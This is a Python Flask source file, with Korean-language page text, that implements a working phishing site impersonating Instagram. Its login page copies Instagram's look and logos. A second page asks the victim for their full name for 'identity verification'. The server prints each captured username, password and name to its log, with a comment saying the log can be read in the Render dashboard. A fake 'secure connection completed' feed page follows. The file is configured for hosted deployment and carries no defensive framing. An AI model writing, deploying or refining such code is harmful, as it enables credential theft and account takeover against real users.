import os
from flask import Flask, request, render_template_string

app = Flask(__name__)

# 1. 로그인 페이지
LOGIN_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>로그인 • Instagram</title>
    <style>
        body { font-family: sans-serif; background-color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .container { width: 100%; max-width: 350px; text-align: center; padding: 20px; }
        .logo { width: 175px; margin-bottom: 40px; }
        input { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; font-size: 14px; }
        .login-btn { width: 100%; padding: 7px; border: none; border-radius: 8px; background-color: #0095f6; color: white; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .forgot { font-size: 12px; color: #385185; margin-top: 20px; text-decoration: none; display: block; }
        .footer-img { margin-top: 60px; width: 60px; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo">
        <form action="/" method="POST">
            <input type="text" name="username" placeholder="사용자 이름, 이메일 주소 또는 휴대폰 번호" required>
            <input type="password" name="password" placeholder="비밀번호" required>
            <button type="submit" class="login-btn">로그인</button>
        </form>
        <a href="#" class="forgot">비밀번호를 잊으셨나요?</a>
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1200px-Meta_Platforms_Inc._logo.svg.png" class="footer-img">
    </div>
</body>
</html>
"""

# 2. 정보 확인 페이지
INFO_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>정보 확인 • Instagram</title>
    <style>
        body { font-family: sans-serif; background-color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .container { width: 100%; max-width: 350px; text-align: center; padding: 20px; }
        .logo { width: 175px; margin-bottom: 20px; }
        p { font-size: 14px; color: #8e8e8e; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; font-size: 14px; }
        .next-btn { width: 100%; padding: 7px; border: none; border-radius: 8px; background-color: #0095f6; color: white; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo">
        <p>본인 확인을 위해 <b>성명</b>을 입력해 주세요.</p>
        <form action="/info" method="POST">
            <input type="hidden" name="username" value="{{ user_id }}">
            <input type="hidden" name="password" value="{{ user_pw }}">
            <input type="text" name="fullname" placeholder="성명" required autofocus>
            <button type="submit" class="next-btn">다음</button>
        </form>
    </div>
</body>
</html>
"""

# 3. 완료 페이지
FEED_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { margin: 0; background: #fafafa; font-family: sans-serif; }
        .header { position: fixed; top: 0; width: 100%; height: 50px; background: white; border-bottom: 1px solid #dbdbdb; display: flex; align-items: center; justify-content: center; z-index: 100; }
        .header img { height: 30px; }
        .post { margin: 70px auto; background: white; border: 1px solid #dbdbdb; max-width: 500px; width: 95%; }
        .post img { width: 100%; }
        .content { padding: 15px; }
    </style>
</head>
<body>
    <div class="header"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1200px-Instagram_logo_2016.svg.png"></div>
    <div class="post">
        <div style="padding:10px; font-weight:bold;">instagram_official</div>
        <img src="https://picsum.photos/500/500">
        <div class="content"><b>좋아요 1,234개</b><br>보안 연결이 성공적으로 완료되었습니다.</div>
    </div>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        user_id = request.form.get('username')
        user_pw = request.form.get('password')
        return render_template_string(INFO_PAGE, user_id=user_id, user_pw=user_pw)
    return render_template_string(LOGIN_PAGE)

@app.route('/info', methods=['POST'])
def info():
    user_id = request.form.get('username')
    user_pw = request.form.get('password')
    full_name = request.form.get('fullname')

    # 서버 로그에 기록 (Render 대시보드 Logs 탭에서 확인 가능)
    print(f"\n[!] DATA COLLECTED")
    print(f"ID: {user_id} | PW: {user_pw} | NAME: {full_name}\n")

    return render_template_string(FEED_PAGE)

if __name__ == '__main__':
    # [수정 핵심] Render 환경변수 PORT를 읽어오도록 설정
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
